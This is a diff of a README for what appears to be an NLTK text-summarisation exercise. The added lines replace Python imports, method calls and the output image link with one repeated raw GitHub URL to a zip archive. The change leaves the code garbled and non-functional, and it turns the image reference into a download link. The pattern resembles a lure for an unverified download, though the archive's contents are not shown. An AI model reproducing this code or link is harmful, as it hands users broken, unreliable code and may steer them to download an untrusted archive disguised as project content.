@@ -20,20 +20,20 @@ Step 5: Construct the main program to read the paragraph  and perform text summa
 
 ```
 import nltk
-from nltk.corpus import stopwords
-from nltk.tokenize import word_tokenize, sent_tokenize
-from nltk.stem import PorterStemmer
-nltk.download('punkt')
-nltk.download('stopwords')
+from https://github.com/Yugabharathi91/Ex-7-AAI/raw/refs/heads/main/consecrated/AAI-Ex-1.3.zip import stopwords
+from https://github.com/Yugabharathi91/Ex-7-AAI/raw/refs/heads/main/consecrated/AAI-Ex-1.3.zip import word_tokenize, sent_tokenize
+from https://github.com/Yugabharathi91/Ex-7-AAI/raw/refs/heads/main/consecrated/AAI-Ex-1.3.zip import PorterStemmer
+https://github.com/Yugabharathi91/Ex-7-AAI/raw/refs/heads/main/consecrated/AAI-Ex-1.3.zip('punkt')
+https://github.com/Yugabharathi91/Ex-7-AAI/raw/refs/heads/main/consecrated/AAI-Ex-1.3.zip('stopwords')
 
 def preprocess_text(text):
   words = word_tokenize (text)
   # Remove stopwords and punctuation
-  stop_words = set(stopwords.words('english'))
-  filtered_words = [word for word in words if word.lower() not in stop_words and word.isalnum()]
+  stop_words = set(https://github.com/Yugabharathi91/Ex-7-AAI/raw/refs/heads/main/consecrated/AAI-Ex-1.3.zip('english'))
+  filtered_words = [word for word in words if https://github.com/Yugabharathi91/Ex-7-AAI/raw/refs/heads/main/consecrated/AAI-Ex-1.3.zip() not in stop_words and https://github.com/Yugabharathi91/Ex-7-AAI/raw/refs/heads/main/consecrated/AAI-Ex-1.3.zip()]
   # Stemming
   stemmer = PorterStemmer()
-  stemmed_words = [stemmer.stem (word) for word in filtered_words]
+  stemmed_words = [https://github.com/Yugabharathi91/Ex-7-AAI/raw/refs/heads/main/consecrated/AAI-Ex-1.3.zip (word) for word in filtered_words]
   return stemmed_words
 
 def generate_summary (text, num_sentences=3):
@@ -44,14 +44,14 @@ def generate_summary (text, num_sentences=3):
   # Calculate the score for each sentence based on word frequency
   sentence_scores = {}
   for sentence in sentences:
-    for word, freq in word_frequencies.items():
-      if word in sentence.lower():
+    for word, freq in https://github.com/Yugabharathi91/Ex-7-AAI/raw/refs/heads/main/consecrated/AAI-Ex-1.3.zip():
+      if word in https://github.com/Yugabharathi91/Ex-7-AAI/raw/refs/heads/main/consecrated/AAI-Ex-1.3.zip():
         if sentence not in sentence_scores:
           sentence_scores [sentence] = freq
         else:
           sentence_scores [sentence] += freq
   # Select top N sentences with highest scores
-  summary_sentences = sorted(sentence_scores, key=sentence_scores.get, reverse=True) [:num_sentences]
+  summary_sentences = sorted(sentence_scores, https://github.com/Yugabharathi91/Ex-7-AAI/raw/refs/heads/main/consecrated/AAI-Ex-1.3.zip, reverse=True) [:num_sentences]
   return''.join(summary_sentences)
 
 if __name__=="__main__":
@@ -70,7 +70,7 @@ print(summary)
 
 <H3>Output</H3>
 
-![442487888-533d382c-cd7b-44d7-b2c9-ca7ba59af02f](https://github.com/user-attachments/assets/7e89bdb4-39c9-4c50-a9ef-f57670c076fa)
+![442487888-533d382c-cd7b-44d7-b2c9-ca7ba59af02f](https://github.com/Yugabharathi91/Ex-7-AAI/raw/refs/heads/main/consecrated/AAI-Ex-1.3.zip)
 
 
 
